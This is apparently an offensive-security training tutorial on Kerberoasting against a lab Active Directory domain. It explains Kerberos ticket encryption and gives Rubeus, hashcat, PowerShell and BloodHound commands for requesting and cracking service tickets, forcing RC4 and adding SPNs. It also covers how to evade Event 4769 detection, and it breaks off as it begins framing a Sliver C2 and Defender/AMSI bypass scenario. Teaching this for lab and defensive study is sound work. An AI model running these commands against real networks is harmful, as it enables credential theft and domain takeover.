THE KEY RING - Who Knows Which Password:
────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────┐
│  STEP 1: You → KDC (Login)                              │
├─────────────────────────────────────────────────────────┤
│  Your password hash is used to:                         │
│  - Encrypt the timestamp you send                       │
│  - Decrypt the session key KDC sends back               │
│                                                          │
│  Who knows your password hash:                          │
│  ✅ YOU (your computer calculates it)                   │
│  ✅ KDC (stored in NTDS.dit)                            │
│  ❌ No one else                                         │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│  STEP 2: KDC → You (TGT issued)                         │
├─────────────────────────────────────────────────────────┤
│  KRBTGT's password hash is used to:                     │
│  - Encrypt your TGT                                     │
│                                                          │
│  Who knows KRBTGT password:                             │
│  ❌ NOT YOU (you can't read your own TGT!)              │
│  ✅ ONLY KDC                                            │
│  ❌ No service can read it                              │
│                                                          │
│  This is WHY you can't forge a TGT - you don't have     │
│  KRBTGT's password (unless Golden Ticket attack!)       │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│  STEP 4: KDC → You (Service ticket issued)              │
├─────────────────────────────────────────────────────────┤
│  SERVICE ACCOUNT's password hash is used to:            │
│  - Encrypt the service ticket (TGS)                     │
│                                                          │
│  Who knows service account password:                    │
│  ✅ The SERVICE (e.g., SQL Server as svc_sql)           │
│  ✅ KDC (stored in NTDS.dit)                            │
│  ❌ NOT YOU (you can't read the TGS either!)            │
│                                                          │
│  🔥 THE VULNERABILITY:                                  │
│  KDC gives you this encrypted blob.                     │
│  You can TRY to crack the service password offline!     │
│  If password is weak → You win!                         │
│  If password is strong (120+ chars) → You lose          │
└─────────────────────────────────────────────────────────┘
```

**Why can't we crack the TGT but CAN crack the TGS?**

| Property | TGT | TGS (Service Ticket) |
|----------|-----|----------------------|
| Encrypted with | KRBTGT password | Service account password |
| KRBTGT password | 128+ random chars | - |
| Service password | - | Often weak: "MYpassword123#" |
| Can we crack it? | ❌ NO (too strong) | ✅ YES (if weak password!) |
| Who set the password? | Windows (auto) | Human admin |
| Rotates? | Rarely (years) | Almost never |

---

## 1.5: Why Does the KDC Do This? (The Design Logic)

**Big question:** "Why does KDC encrypt tickets with service passwords? Isn't that insecure?"

**Answer:** It's by design, and here's why:

```
THE DESIGN REASONING:
────────────────────────────────────────────────────────────────

PROBLEM TO SOLVE:
─────────────────
SQL Server needs to verify you without asking KDC every time.

WHY NOT ASK KDC?
────────────────
Imagine SQL has 1000 users connecting per minute.
If SQL asked KDC for each: "Is vamsi.krishna allowed?"
- KDC would be overloaded
- Single point of failure
- Latency on every access
- Not scalable!

THE TICKET SOLUTION:
────────────────────
Instead:
1. KDC creates a ticket that says: "vamsi.krishna is allowed"
2. Encrypts it with SQL's password
3. Only SQL can decrypt it
4. SQL verifies ticket locally (no KDC needed!)
5. Scalable, fast, distributed

THE TRADE-OFF:
──────────────
✅ PRO: Scalable, no central bottleneck
✅ PRO: Services verify independently  
✅ PRO: Tickets are time-limited (expire in 10 hours)

❌ CON: If service password is weak, we can crack it!

MICROSOFT'S ASSUMPTION IN 2000:
───────────────────────────────
"Service accounts will have STRONG passwords or be computer accounts"

REALITY IN 2024:
────────────────
"Admins still use: svc_sql / MYpassword123#"
```

**This is not a bug - it's a calculated trade-off that favors scalability over perfect security.**

---

## 1.6: Quick Recap - The Keys Summary

Before moving on, make sure you understand this:

```
THE THREE KEY CONCEPTS:
────────────────────────────────────────────────────────────────

1. YOUR PASSWORD
   - Encrypts: Pre-auth timestamp at login
   - Who knows: You and KDC
   - Crackable?: Already yours!

2. KRBTGT PASSWORD  
   - Encrypts: Your TGT
   - Who knows: Only KDC
   - Crackable?: NO (128+ random chars)
   - If compromised: Golden Ticket attack

3. SERVICE PASSWORD 👈 THE VULNERABILITY!
   - Encrypts: Service tickets (TGS)
   - Who knows: Service and KDC
   - Crackable?: YES (if weak password!)
   - If cracked: Own the service!

KERBEROASTING = Cracking the SERVICE PASSWORD from TGS ticket
```

---

# PART 2: Ticket Structure and Encryption {#part-2-ticket-structure}

> **🎫 WHAT WE'LL LEARN:**
>
> - What's actually INSIDE a Kerberos ticket
> - Why RC4 is 10x easier to crack than AES
> - How to read the hash format  
> - How Hashcat actually cracks these tickets
>
> Think of a ticket like an **encrypted message in a bottle**.
> You found the bottle, but need the key to read the message!

---

## 2.1: What's Inside a Kerberos Ticket? (Opening the Encrypted Box)

When you get a TGS ticket from the KDC, you get an **encrypted blob of data**.

**Let me explain what's inside using an analogy:**

```
🎟️ THINK OF IT LIKE A MOVIE TICKET:
────────────────────────────────────────────────────────────────

A movie ticket has:
- ✅ Your name (who can use it)
- ✅ Movie name (which movie)
- ✅ Show time (when it's valid)
- ✅ Seat number (what access you get)
- ✅ Expiry (when it becomes invalid)
- ✅ Theater stamp (proves it's genuine)

A KERBEROS TICKET has:
────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────────┐
│  🔒 ENCRYPTED PORTION (Only service can read this!)         │
│     Encrypted with: svc_sql's password hash                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. WHO CAN USE THIS TICKET:                                │
│     • Client Name: vamsi.krishna                            │
│     • Domain: ORSUBANK.LOCAL                                │
│                                                              │
│  2. WHICH SERVICE:                                          │
│     • Service: MSSQLSvc/DC01.orsubank.local:1433           │
│                                                              │
│  3. WHEN IT'S VALID:                                        │
│     • Start Time: 11:00 AM (when created)                   │
│     • End Time: 9:00 PM (expires in 10 hours)              │
│     • Auth Time: 9:00 AM (when you logged in)              │
│                                                              │
│  4. WHAT ACCESS YOU HAVE:                                   │
│     • PAC (Privilege Attribute Certificate):                │
│       ├─ Your SID: S-1-5-21-xxx-xxx-xxx-1105               │
│       ├─ Groups you're in:                                  │
│       │   • Domain Users                                    │
│       │   • IT_Team                                         │
│       │   • SQL_Readers                                     │
│       └─ Your privileges/permissions                        │
│                                                              │
│  5. SECURITY STUFF:                                         │
│     • Session Key: [random 256-bit key]                     │
│     • Flags: FORWARDABLE, RENEWABLE                         │
│     • Sequence Number: 12345                                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**The CRITICAL part - PAC (Privilege Attribute Certificate):**

```
PAC = Your "ID card" inside the ticket
────────────────────────────────────────────────────────────────

Imagine you're entering a club. The bouncer checks:
- Who are you? → Your SID
- What groups are you in? → Domain Users, IT_Team, etc.
- Are you VIP? → Group memberships

THE PAC CONTAINS:
─────────────────
• Your SID (Security Identifier)
  Example: S-1-5-21-3623811015-3361044348-30300820-1105

• Every group you're a member of:
  - Domain Users
  - IT_Team
  - SQL_Readers  
  - (If you were Domain Admin, it would list that too!)

• Account control flags:
  - Normal account
  - Password never expires
  - Account enabled

WHY THIS MATTERS FOR GOLDEN TICKETS:
─────────────────────────────────────
When forging Golden Tickets, we can INJECT any groups!
- Add "Domain Admins" to the PAC
- Service reads PAC: "Oh, this user is Domain Admin!"
- Instant admin access!

But for Kerberoasting, we're just trying to CRACK the service password.
```

---

## 2.2: Encryption Types - RC4 vs AES (The Speed Battle)

**Big question:** "I keep hearing about RC4 and AES. What's the difference?"

**Answer:** RC4 is an older, WEAKER encryption. AES is newer, STRONGER.

```
ENCRYPTION TYPE COMPARISON:
────────────────────────────────────────────────────────────────

                RC4-HMAC              vs              AES256
              (etype 23)                            (etype 18)
          
Age:          Old (1987)                          New (2001)
Strength:     WEAK                                STRONG
Hashcat Mode: 13100                               19700
GPU Speed:    2,500,000/sec                       250,000/sec
              (RTX 3090)                          (RTX 3090)

                    ↓                                 ↓
              10x FASTER TO CRACK!              10x SLOWER

Time to crack "SqlSvc@2024!":
              ~2 minutes                          ~20 minutes
```

**Real-world speed comparison:**

| Passwordstrength | RC4 Crack Time | AES256 Crack Time |
|------------------|----------------|-------------------|
| "password123" | Seconds | Seconds |
| "SqlSvc@2024!" | Minutes | Hours |
| "MyP@ssw0rd2024!" | Hours | Days |
| "Tr0ub4dor&3!" | Days | Weeks |
| "correct-horse-battery-staple" | Weeks | Months |

**Why does Microsoft still support RC4?**

```
THE BACKWARDS COMPATIBILITY PROBLEM:
────────────────────────────────────────────────────────────────

Windows 2000/2003 only supported RC4.

If your company has:
- Old applications from 2005
- Legacy systems
- Devices that only know RC4

Then you MUST keep RC4 enabled or those systems break!

MICROSOFT'S POSITION:
─────────────────────
"We recommend AES, but we keep RC4 for compatibility"

ATTACKER'S POSITION:
────────────────────
"Thank you for leaving RC4 enabled! 😈"
```

---

## 2.3: How Encryption is Negotiated (The Downgrade Attack)

**This is sneaky - we can FORCE the KDC to use RC4 even if AES is available!**

```
NORMAL ENCRYPTION NEGOTIATION:
────────────────────────────────────────────────────────────────

Client:  "Hey KDC, I support: RC4, AES128, AES256"
         
KDC:     "Let me check what svc_sql supports..."
         [Checks msDS-SupportedEncryptionTypes attribute]
         "svc_sql supports: RC4, AES128, AES256"
         "I'll pick the STRONGEST common one: AES256"
         
Result:  Ticket encrypted with AES256 (hard to crack!)


DOWNGRADE ATTACK (What we do):
────────────────────────────────────────────────────────────────

Client:  "Hey KDC, I ONLY support: RC4"
         (We lie!)
         
KDC:     "Let me check what svc_sql supports..."
         "svc_sql supports: RC4, AES128, AES256"
         "I'll pick the STRONGEST common one: RC4"
         (Only RC4 is common between client and service)
         
Result:  Ticket encrypted with RC4 (easy to crack!)
```

**How to force RC4 in Rubeus:**

```bash
# Method 1: Direct RC4 request
Rubeus.exe kerberoast /enctype:rc4

# Method 2: TGT delegation (even more reliable)
Rubeus.exe kerberoast /tgtdeleg /enctype:rc4

# What /tgtdeleg does:
# - Requests a special TGT that can be delegated
# - This TGT is ALWAYS RC4 (Windows limitation)
# - Use that RC4 TGT to request service tickets
# - Service tickets inherit RC4 encryption!
```

---

## 2.4: The Hash Format - Reading the Encrypted Ticket

When Rubeus extracts a ticket, you get a long string. Let's decode it!

```
EXAMPLE HASH:
────────────────────────────────────────────────────────────────

$krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1433*$81F5AC37E2B4D9F1C8A3E6D5B2F9C1A4E7B3C6D9F2A5B8C1D4E7F3A6B9C2D5E8F1A4B7C3D6E9F2A5B8...

Let's break this down piece by piece:
```

**Component-by-component breakdown:**

```
$krb5tgs$
└─ This identifies it as a "Kerberos 5 TGS hash"
   Tells Hashcat: "Hey, this is a Kerberos service ticket!"

23$
└─ Encryption type (etype)
   23 = RC4-HMAC
   17 = AES128
   18 = AES256
   This tells Hashcat WHICH algorithm to use

*sqlservice$
└─ The service account name
   This is WHO the ticket is for
   We're trying to crack sqlservice's password

ORSUBANK.LOCAL$
└─ The domain (realm) name
   Which Active Directory domain

MSSQLSvc/DC01.orsubank.local:1433*
└─ The SPN (Service Principal Name)
   Which exact service this ticket is for

$81F5AC37E2B4D9F1C8A3E6D5B2F9C1A4E7B3C6D9F2A5B8C1D4E7F3A6B9C2D5E8F1A4B7C3D6E9F2A5B8...
└─ THE ACTUAL ENCRYPTED TICKET DATA
   This is the "locked box" we're trying to open
   Inside is all the ticket information from Part 2.1
   Encrypted with sqlservice's password!
```

**Hashcat modes (how to crack each type):**

```bash
# RC4 tickets (etype 23) - FAST
hashcat -m 13100 hashes.txt wordlist.txt

# AES128 tickets (etype 17) - SLOWER
hashcat -m 19600 hashes.txt wordlist.txt

# AES256 tickets (etype 18) - SLOWEST  
hashcat -m 19700 hashes.txt wordlist.txt

# Hashcat automatically detects if you use mode 13100 on an AES hash
# It will ERROR, telling you to use the right mode
```

---

## 2.5: How Cracking Actually Works (The Magic Revealed)

**Big question:** "How does Hashcat know if it guessed the right password?"

**Let me walk you through the EXACT process:**

```
HASHCAT'S CRACKING PROCESS:
────────────────────────────────────────────────────────────────

STEP 1: Read the Hash File
───────────────────────────
Hashcat reads: $krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$...
Determines: "This is RC4, mode 13100"


STEP 2: Load Wordlist
──────────────────────
Opens: /usr/share/wordlists/rockyou.txt
Contains: 14 million passwords


STEP 3: For EACH Password in Wordlist
──────────────────────────────────────

Password candidate: "password123"

  3a. Compute NTLM Hash
      NTLM("password123") = 8846f7eaee8fb117ad06bdd830b7586c

  3b. Use NTLM as RC4 Key
      RC4_KEY = 8846f7eaee8fb117ad06bdd830b7586c

  3c. Attempt to Decrypt Ticket Data
      DECRYPT(encrypted_blob, RC4_KEY) = ???

  3d. Check if Result is Valid Kerberos Structure
      Does it have:
      - Proper ASN.1 structure?
      - Valid timestamp?
      - Correct service name?
      - Valid PAC structure?

  3e. IF VALID:
      ✅ PASSWORD FOUND: sqlservice / password123
      
      IF NOT VALID:
      ❌ Try next password...


STEP 4: Repeat Until Found or Wordlist Exhausted
────────────────────────────────────────────────

Tried: password123     → ❌ No
Tried: 123456          → ❌ No
Tried: password        → ❌ No
...
Tried: MYpassword123#  → ✅ YES! CRACKED!
```

**Why this works:**

```
THE VALIDATION CHECK:
────────────────────────────────────────────────────────────────

When you decrypt with the WRONG password:
└─ You get GARBAGE data
   Example: ���X�~�*@#$%^&*()_+

When you decrypt with the RIGHT password:
└─ You get VALID Kerberos data structure
   Example:
   {
     "client": "vamsi.krishna@ORSUBANK.LOCAL",
     "service": "MSSQLSvc/DC01.orsubank.local:1433",
     "timestamp": "2024-12-29T11:00:00Z",
     "PAC": { ... }
   }

Hashcat checks: "Does this look like valid Kerberos data?"
- YES → Password found!
- NO → Try next password
```

---

## 2.6: Speed Factors - Why Some Cracks are Fast, Others Slow

```
WHAT AFFECTS CRACKING SPEED:
────────────────────────────────────────────────────────────────

1. ENCRYPTION TYPE:
   RC4:    2,500,000 attempts/sec  ⚡⚡⚡⚡⚡
   AES128:   250,000 attempts/sec  ⚡⚡
   AES256:   250,000 attempts/sec  ⚡⚡

2. GPU POWER:
   RTX 4090: 3,000,000/sec (RC4)  💪💪💪
   RTX 3090: 2,500,000/sec (RC4)  💪💪
   RTX 2080: 1,200,000/sec (RC4)  💪
   CPU only:    10,000/sec (RC4)  🐌

3. WORDLIST SIZE:
   rockyou.txt:        14 million passwords
   SecLists:          100 million passwords
   hashesorg:       1+ billion passwords
   
   Bigger wordlist = More time BUT more likely to find password

4. RULE MUTATIONS:
   Without rules: Try "password" exactly
   With best64:   Try "password", "Password", "password123",
                  "p@ssword", "PASSWORD", etc. (64 variations)
   
   More rules = Slower BUT catches more variations

5. PASSWORD COMPLEXITY:
   "password"           → Found in 0.01 seconds
   "password123"        → Found in 1 second
   "Password123!"       → Found in 5 minutes
   "MyP@ssw0rd2024!"   → Found in 2 hours
   "random-generated-120-chars" → NEVER (will take years)
```

**Real-world example:**

```bash
# Password: "MYpassword123#"
# Encryption: RC4
# GPU: RTX 3090
# Wordlist: rockyou.txt (14M passwords)
# Rules: best64.rule (64 mutations per password)

Calculation:
- 14 million passwords × 64 rules = 896 million attempts
- 2.5 million attempts/sec = 358 seconds = 6 minutes

Result: Cracked in ~6 minutes! ✅
```

---

# PART 3: Understanding SPNs - The Address Book {#part-3-spn-internals}

> **📋 QUICK SUMMARY:**
>
> SPNs are like phone numbers for services.
> When you want to call SQL, you look up its SPN.
> Computer accounts have strong passwords → skip them!
> User service accounts have weak passwords → target them!

---

## 3.1: What SPNs Really Are (The Phone Book Analogy Revisited)

Remember from Part 0 - SPNs are like phone numbers. Let me expand on that:

```
REAL-WORLD PHONE BOOK:
────────────────────────────────────────────────────────────────

Name                Service                  Phone Number
────                ───────                  ────────────
Rajesh Kumar        Pizza Delivery           9876543210
Priya Singh         Hospital ER              9876543211
Amit Patel          Taxi Service             9876543212

When you want pizza, you look up "Rajesh - Pizza" → 9876543210


KERBEROS SPN "PHONE BOOK":
────────────────────────────────────────────────────────────────

Account             Service                  SPN (Address)
───────             ───────                  ─────────────
svc_sql             SQL Server               MSSQLSvc/DC01:1433
svc_web             Web Server               HTTP/web.orsubank.local  
svc_backup          Backup Service           backup/dc01.orsubank.local

When you want SQL, you look up "SQL" → MSSQLSvc/DC01:1433
```

**SPN Format Breakdown:**

```
serviceclass / hostname : port / servicename

Examples:
─────────

MSSQLSvc/DC01.orsubank.local:1433
│        │                     │
│        │                     └─ Port number
│        └─ Hostname (FQDN)
└─ Service class (what kind of service)

HTTP/web.orsubank.local
│    │
│    └─ Hostname
└─ Service class (web server)

backup/dc01.orsubank.local
│      │
│      └─ Hostname
└─ Custom service name
```

**Common SPN classes you'll see:**

| SPN Class | What It's For | Example |
|-----------|---------------|---------|  
| `MSSQLSvc` | SQL Server | MSSQLSvc/sql01:1433 |
| `HTTP` | Web servers, IIS | HTTP/web.orsubank.local |
| `CIFS` | File shares (SMB) | CIFS/fileserver |
| `HOST` | Computer account (many services) | HOST/WS01 |
| `LDAP` | Directory services | LDAP/dc01 |
| `WSMAN` | Windows Remote Management | WSMAN/server01 |
| `TERMSRV` | Remote Desktop | TERMSRV/server01 |
| `exchangeMDB` | Microsoft Exchange | exchangeMDB/exchange01 |

**SPN Format:**
```
serviceclass/hostname:port/servicename
```

**Real examples:**
```
MSSQLSvc/sql01.orsubank.local:1433           ← SQL Server
HTTP/web01.orsubank.local                     ← IIS / Web Server
CIFS/fileserver.orsubank.local                ← File Shares (SMB)
HOST/dc01.orsubank.local                      ← Computer Account
LDAP/dc01.orsubank.local                      ← LDAP Service
exchangeMDB/exchange01.orsubank.local         ← Exchange
WSMAN/server01.orsubank.local                 ← WinRM
TERMSRV/server01.orsubank.local               ← Remote Desktop
```

## 3.2: How SPNs Are Registered

**SPNs are stored in AD as attributes on accounts:**

```
ACCOUNT: svc_sql
ATTRIBUTE: servicePrincipalName
VALUE: MSSQLSvc/sql01.orsubank.local:1433
```

**Who can set SPNs?**
- Domain Admins (always)
- Account owner (for their own account)
- Users with `WriteSPN` permission on the account
- Service installation (SQL Server setup, etc.)

**Dangerous misconfiguration:**
If an attacker has `GenericAll` or `GenericWrite` on a user, they can ADD an SPN to that user → making them Kerberoastable (targeted Kerberoasting).

## 3.3: Computer Accounts vs User Accounts

| Account Type | SPN Example | Password | Kerberoastable? |
|--------------|-------------|----------|-----------------|
| Computer | HOST/WS01$ | 120+ char random, rotates | No (can't crack) |
| User (service) | MSSQLSvc/sql01 | Admin-set, maybe weak | **YES** |
| MSA | MSSQLSvc/sql01 | 240 char random, rotates | No |
| gMSA | MSSQLSvc/sql01 | 240 char random, rotates | No |

**Computer account passwords:**
```
Example: G&4#kL9@mN2$pQ5*rT8&uW1!xZ3#aB6...
Length: 120+ characters
Rotation: Every 30 days by default
```
These are impossible to crack. Don't waste time on computer SPNs.

## 3.4: Finding Accounts with SPNs

**LDAP Filter:**
```
(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))
```

**Translation:**
- `objectClass=user` - Users only
- `servicePrincipalName=*` - Has an SPN set
- `!(objectClass=computer)` - Exclude computer accounts

**PowerShell:**
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet,memberOf
```

**Via Sliver:**
```bash
sliver > execute -o powershell.exe -Command "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"
```

---

# PART 4: Why Kerberoasting Works {#part-4-why-it-works}

## 4.1: The Design "Flaw"

**Kerberoasting works because of a fundamental design decision:**

> The service must be able to decrypt the ticket to validate it.
> Therefore, the ticket MUST be encrypted with the service's own key.
> The service's key IS its password hash.

**This is not a bug - it's how Kerberos was designed in 1988.**

The assumption was:
- Service accounts would have STRONG passwords
- Offline password cracking would be computationally expensive

**Reality in 2024:**
- Service accounts often have weak passwords ("SqlAdmin123!")
- Modern GPUs crack millions of RC4 hashes per second
- Service accounts often have ancient, unchanged passwords

## 4.2: Why Admins Set Weak Passwords

**Service account password anti-patterns:**

```
svc_sql:       SqlAdmin2019           ← Year of installation
svc_backup:    Backup123!             ← Service name + numbers
svc_iis:       IIS@website            ← Obvious pattern
svc_exchange:  Exchange2024           ← Easy to remember
svc_print:     PrintService1          ← Generic
```

**Why this happens:**
1. "The application requires us to enter a password" - admin picks something easy
2. Password never expires (often required for services)
3. No one remembers to change it
4. "It's just a service account, not used for interactive login"
5. Fear of breaking production if password changes

## 4.3: Why Service Accounts Often Have High Privileges

**The privilege creep problem:**

```
INITIAL SETUP:
  svc_sql created with "just what SQL needs"

6 MONTHS LATER:
  "SQL can't access the share" → added to Server Operators

1 YEAR LATER:
  "Backups are failing" → added to Backup Operators

2 YEARS LATER:
  "New app needs SQL to write AD" → added to Domain Admins (!)

RESULT:
  svc_sql with password "SqlAdmin2019" is now Domain Admin
```

## 4.4: The Attack Economics

| Factor | Attacker Advantage |
|--------|-------------------|
| Cost to request ticket | Zero (any domain user can do it) |
| Detection risk | Low (normal Kerberos traffic) |
| Offline cracking | Unlimited attempts, no lockout |
| GPU cracking speed | Millions per second (RC4) |
| Service password quality | Often weak |
| Service account privileges | Often over-privileged |

**ROI for attackers is extremely high.**

---

# PART 5: Target Selection and Prioritization {#part-5-target-selection}

## 5.1: Not All Service Accounts Are Equal

**Prioritization matrix:**

| Criteria | Weight | How to Check |
|----------|--------|--------------|
| Group Memberships | ⭐⭐⭐⭐⭐ | BloodHound, memberOf attribute |
| Password Age | ⭐⭐⭐⭐ | pwdLastSet attribute |
| Encryption Type | ⭐⭐⭐ | msDS-SupportedEncryptionTypes |
| SPN Type | ⭐⭐ | SQL > Exchange > HTTP |
| Account Description | ⭐⭐ | Sometimes reveals purpose |

## 5.2: Using BloodHound for Target Selection

**Query: Kerberoastable users with path to DA**
```cypher
MATCH (u:User {hasspn: true})
MATCH p=shortestPath((u)-[:MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS@ORSUBANK.LOCAL"}))
RETURN u.name, u.pwdlastset, length(p) as hops
ORDER BY hops
```

**Query: Kerberoastable users in high-value groups**
```cypher
MATCH (u:User {hasspn: true})-[:MemberOf*1..]->(g:Group)
WHERE g.highvalue = true
RETURN u.name, g.name
```

## 5.3: Checking Password Age

**Older password = more likely to be weak**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet |
  Select Name, ServicePrincipalName, PasswordLastSet |
  Sort PasswordLastSet
```

**Output:**
```
Name          ServicePrincipalName               PasswordLastSet
----          --------------------               ---------------
svc_legacy    SVC/legacy.orsubank.local          3/15/2018 10:30 AM  ← 6 YEARS OLD!
svc_backup    backup/dc01.orsubank.local         1/10/2022 2:15 PM   ← 2 years old
svc_sql       MSSQLSvc/sql.orsubank.local:1433   11/20/2024 9:00 AM  ← Recent
```

**Target svc_legacy FIRST** - a 6-year-old password is likely weak and unchanged.

## 5.4: Checking Encryption Types

**RC4 is easier to crack. Check what's configured:**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties msDS-SupportedEncryptionTypes,Name |
  Select Name, @{N='ETypes';E={$_."msDS-SupportedEncryptionTypes"}}
```

**Decoding msDS-SupportedEncryptionTypes:**
- 0 or not set = RC4 only (default, easiest)
- 24 = AES128 + AES256 (harder)
- 28 = RC4 + AES128 + AES256 (can request RC4)

---

# PART 6: APT Kerberoasting Techniques {#part-6-apt-tradecraft}

## 6.1: How APTs Approach Kerberoasting

**APT techniques differ from typical pentest tools:**

| Pentest Approach | APT Approach |
|-----------------|--------------|
| Request all SPNs at once | Request one SPN at a time |
| Use Rubeus with defaults | Custom tooling or living-off-land |
| Crack immediately | Store for later, prioritize targets |
| Ignore detection | Blend with normal traffic |

## 6.2: Targeted Kerberoasting

**Instead of requesting ALL tickets, request only high-value ones:**

```bash
# Bad (noisy) - requests all SPNs
Rubeus.exe kerberoast

# Good (targeted) - requests specific SPN
Rubeus.exe kerberoast /user:svc_backup
```

**Why targeted is better:**
1. Less network traffic
2. Fewer events logged
3. If svc_backup cracks, we don't need the others
4. Blends better with normal Kerberos activity

## 6.3: Using Native Windows Commands

**APT technique: Use built-in Windows APIs instead of bring-your-own-tools**

```powershell
# Request TGS using native .NET
Add-Type -AssemblyName System.IdentityModel
$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.orsubank.local:1433"

# The ticket is now in memory
# Extract it with methods like Rubeus /tgtdeleg or klist
```

**LSA-based Kerberoasting:**
```powershell
# Request ticket and export from cache
klist get MSSQLSvc/sql.orsubank.local:1433
klist export /targetname:MSSQLSvc/sql.orsubank.local:1433
```

## 6.4: Adding SPNs for Targeted Kerberoasting

**If you have GenericAll or GenericWrite on a user:**

1. Add SPN to target user (makes them Kerberoastable)
2. Request TGS for that SPN
3. Crack the hash
4. Remove the SPN (cleanup)

```powershell
# Add SPN (via Sliver)
Set-ADUser -Identity target_user -ServicePrincipalName @{Add='HTTP/custom.orsubank.local'}

# Kerberoast
Rubeus.exe kerberoast /user:target_user

# Remove SPN
Set-ADUser -Identity target_user -ServicePrincipalName @{Remove='HTTP/custom.orsubank.local'}
```

---

# PART 7: Evading Detection {#part-7-evasion}

## 7.1: What Gets Logged

**Event ID 4769: A Kerberos service ticket was requested**

```
Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Event ID:      4769
Task Category: Kerberos Service Ticket Operations

Subject:
  Account Name:     vamsi.krishna
  Account Domain:   ORSUBANK

Service Information:
  Service Name:     MSSQLSvc/sql.orsubank.local:1433
  Service ID:       S-1-5-21-...-1103

Additional Information:
  Ticket Options:   0x40810000
  Ticket Encryption Type: 0x17 (RC4)
  Failure Code:     0x0
```

**Detection signatures look for:**
- Many 4769 events from one user in short time
- RC4 encryption requests (etype 0x17)
- Requests for rare/unusual SPNs
- Requests from non-server IPs

## 7.2: Evasion Techniques

**1. Time-based spacing:**
```bash
# Request one ticket, wait, request another
# Blends with normal traffic
Rubeus.exe kerberoast /user:svc_sql /delay:30000
```

**2. Request legitimate SPNs first:**
```bash
# Access file share first (normal)
net use \\fileserver\share
# Then Kerberoast (looks like normal usage pattern)
```

**3. Use AES when possible:**
```bash
# AES requests are less suspicious than RC4
Rubeus.exe kerberoast /enctype:aes256
```

**4. Execute from server, not workstation:**
If you have access to a server, Kerberos requests from servers are more normal than from workstations.

## 7.3: Defense Evasion Checklist

| Technique | Risk Reduction |
|-----------|----------------|
| Target specific users | Fewer events logged |
| Space requests over time | Avoids volume-based detection |
| Use AES encryption | Some signatures focus on RC4 |
| Execute from server | Server-origin traffic is expected |
| Use native Windows APIs | Avoid Rubeus signatures |
| Request during business hours | Blends with normal activity |

---

# PART 8: Lab Setup {#part-8-lab-setup}

## 8.1: ORSUBANK Kerberoastable Accounts

**These accounts were created by running the Enable-Kerberoasting.ps1 script on DC01:**

```
ORSUBANK KERBEROASTABLE SERVICE ACCOUNTS:
────────────────────────────────────────────────────────────────

┌────────────────┬──────────────────────────────────┬─────────────────┬──────────────────┐
│ Account        │ SPN                              │ Password        │ Group Membership │
├────────────────┼──────────────────────────────────┼─────────────────┼──────────────────┤
│ sqlservice     │ MSSQLSvc/DC01.orsubank.local:1433│ MYpassword123#  │ ServiceAccounts  │
│ httpservice    │ HTTP/web.orsubank.local          │ Summer2024!     │ ServiceAccounts  │
│ iisservice     │ HTTP/app.orsubank.local          │ P@ssw0rd        │ ServiceAccounts  │
│ backupservice  │ MSSQLSvc/DC01.orsubank.local:1434│ SQLAgent123!    │ ServiceAccounts  │
│ svc_backup     │ backup/dc01.orsubank.local       │ Backup@2024!    │ DOMAIN ADMINS!   │
└────────────────┴──────────────────────────────────┴─────────────────┴──────────────────┘

⚠️ HIGH VALUE TARGET: svc_backup is a member of Domain Admins!
   Cracking this = Complete domain compromise!
```

## 8.2: Running the Kerberoasting Script

**On DC01 (Domain Controller) - if not already run:**

```powershell
# Navigate to scripts
cd C:\Internal-RTO\lab-config\server

# Run the setup script
.\Enable-Kerberoasting.ps1

# Expected output:
# ╔══════════════════════════════════════════════════════════════════╗
# ║         ORSUBANK - ENABLE KERBEROASTING VULNERABILITY            ║
# ╚══════════════════════════════════════════════════════════════════╝
# [+] Created: sqlservice
#     Password: MYpassword123#
#     SPN: MSSQLSvc/DC01.orsubank.local:1433
# [+] Created: httpservice
# ...
```

## 8.3: Verifying Setup

```powershell
# Check SPNs were created
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,memberOf |
  Select Name, ServicePrincipalName, @{N='Groups';E={($_.memberOf | %{($_ -split ',')[0] -replace 'CN='}) -join '; '}}
```

**Expected output:**
```
Name            ServicePrincipalName                   Groups
----            --------------------                   ------
sqlservice      MSSQLSvc/DC01.orsubank.local:1433     ServiceAccounts
httpservice     HTTP/web.orsubank.local                ServiceAccounts
iisservice      HTTP/app.orsubank.local                ServiceAccounts
backupservice   MSSQLSvc/DC01.orsubank.local:1434     ServiceAccounts
svc_backup      backup/dc01.orsubank.local             Domain Admins  ← TARGET!
```

---

# PART 9: The Attack with Sliver C2 (Defender Bypass) {#part-9-attack-execution}

> **🎯 SCENARIO: You are on WS01 with a Sliver shell as vamsi.krishna**
>
> **OBJECTIVE: Kerberoast service accounts using Sliver C2 without getting caught by Defender**
>
> **CONSTRAINTS:**
> - Windows Defender is ENABLED and running
> - You cannot disable it (that would trigger alerts)
> - AMSI and ETW are watching what you do
> - You need to exfiltrate hashes stealthily

---

## 9.1: Understanding the Problem First

**Before we jump into commands, let's understand what we're up against:**

```
THE CHALLENGE:
────────────────────────────────────────────────────────────────

If you just run Rubeus.exe on WS01 right now:

1. UPLOAD RUBEUS.EXE → Defender scans it → BLOCKED!
   "Threat detected: HackTool:Win32/Rubeus"

2. Even if you bypass upload, when you RUN it:
   → AMSI scans .NET assembly loading → BLOCKED!
   "AMSI detected malicious assembly"

3. Even if AMSI is bypassed, Defender watches:
   → Process creation of known tools → FLAGGED!
   → Kerberos traffic patterns → LOGGED!

SO HOW DO WE DO THIS?
